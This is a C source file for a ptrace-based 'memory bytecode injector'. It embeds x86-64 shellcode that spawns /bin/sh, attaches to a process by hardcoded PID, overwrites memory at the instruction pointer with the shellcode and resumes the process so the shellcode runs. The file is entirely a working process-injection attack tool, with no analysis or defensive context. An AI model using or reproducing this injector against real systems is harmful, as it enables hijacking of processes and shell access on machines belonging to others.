#include <stdio.h>        // C standard input-output
#include <stdlib.h>       // C Standard General Utilities Library
#include <string.h>       // C string library header
#include <unistd.h>       // standard symbolic constants and types
#include <sys/wait.h>     // declarations for waiting
#include <sys/ptrace.h>   // gives access to ptrace functionality
#include <sys/user.h>     // gives reference to registers
#include <errno.h>        // error handling

// The shellcode that calls /bin/sh
char shellcode[] = {
    "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97"
    "\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
};

// Header for our program
void header() {
    printf("----Memory bytecode injector-----\n"); 
}

// Main program with hardcoded PID
int main() {
    int i, size;
    int pid = 12345;  // Hardcoded PID, replace with the actual PID you want to inject into
    struct user_regs_struct regs; // struct that gives access to registers
    char* buff;

    header();

    size = sizeof(shellcode);

    // Allocate memory for the shellcode
    buff = (char*)malloc(size);
    if (!buff) {
        perror("malloc");
        return 1;
    }

    // Fill the buff memory with 0s up to size
    memset(buff, 0x0, size);

    // Copy shellcode from source to destination
    memcpy(buff, shellcode, size);

    // Attach to the process with given pid
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1) {
        perror("ptrace(PTRACE_ATTACH)");
        free(buff);
        return 1;
    }

    // Wait for the child to change state
    waitpid(pid, NULL, 0);

    // Get the process's current register values
    if (ptrace(PTRACE_GETREGS, pid, 0, &regs) == -1) {
        perror("ptrace(PTRACE_GETREGS)");
        ptrace(PTRACE_DETACH, pid, 0, 0);
        free(buff);
        return 1;
    }

    printf("Current RIP: 0x%llx, process %d\n", regs.rip, pid);

    // Inject the shellcode into the process's memory
    for (i = 0; i < size; i += sizeof(long)) {
        long data;
        memcpy(&data, buff + i, sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, regs.rip + i, data) == -1) {
            perror("ptrace(PTRACE_POKETEXT)");
            ptrace(PTRACE_DETACH, pid, 0, 0);
            free(buff);
            return 1;
        }
    }

    // Set the instruction pointer to the shellcode address
    regs.rip += 2; // Adjust the RIP to point to the injected shellcode
    if (ptrace(PTRACE_SETREGS, pid, 0, &regs) == -1) {
        perror("ptrace(PTRACE_SETREGS)");
        ptrace(PTRACE_DETACH, pid, 0, 0);
        free(buff);
        return 1;
    }

    // Detach from the process and free allocated memory
    if (ptrace(PTRACE_DETACH, pid, 0, 0) == -1) {
        perror("ptrace(PTRACE_DETACH)");
        free(buff);
        return 1;
    }

    free(buff);
    printf("Shellcode injected and process resumed.\n");
    return 0;
}
